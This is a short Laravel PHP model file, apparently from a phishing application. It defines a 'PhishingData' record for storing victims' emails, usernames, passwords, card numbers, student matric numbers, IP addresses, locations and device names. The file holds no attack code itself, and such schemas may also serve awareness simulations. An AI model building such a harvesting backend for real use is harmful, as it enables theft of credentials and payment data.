<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class PhishingData extends Model
{
    use HasFactory;

    protected $fillable = [
        'email',
        'username',
        'card_number',
        'matric_number',
        'password',
        'ip_address',
        'location',
        'device_name',
    ];
}
